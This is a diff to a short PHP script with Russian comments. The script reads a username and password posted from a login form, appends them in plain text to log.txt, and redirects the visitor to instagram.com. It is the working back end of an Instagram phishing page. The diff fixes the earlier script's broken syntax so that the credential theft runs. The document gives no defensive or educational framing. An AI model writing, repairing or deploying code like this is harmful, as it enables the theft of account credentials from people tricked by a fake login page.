@@ -1,12 +1,24 @@
-<? php
+<?php
+// Получаем данные из формы
+$username = $_POST['username'];
+$password = $_POST['password'];
 
-$username = $_POST['username' ];
-$password = $_POST['password' ];
+// Открываем файл для записи (добавление в конец файла)
+$fp = fopen('log.txt', 'a+');
 
-$fp = fopen( filename:'log.txt', mode:'a+');
-fwrite($fp, string: 'Username:
-fwrite($fp,
-fwrite($fp,
-fclose($fp);
+// Проверяем, что файл открыт успешно
+if ($fp) {
+    // Записываем данные в файл
+    fwrite($fp, "Username: " . $username . "\n");
+    fwrite($fp, "Password: " . $password . "\n\n");
+    
+    // Закрываем файл после записи
+    fclose($fp);
+} else {
+    echo "Не удалось открыть файл для записи.";
+}
 
-header( string: 'Location: https://instagram.com');
+// Перенаправляем на страницу Instagram
+header('Location: https://instagram.com');
+exit;
+?>
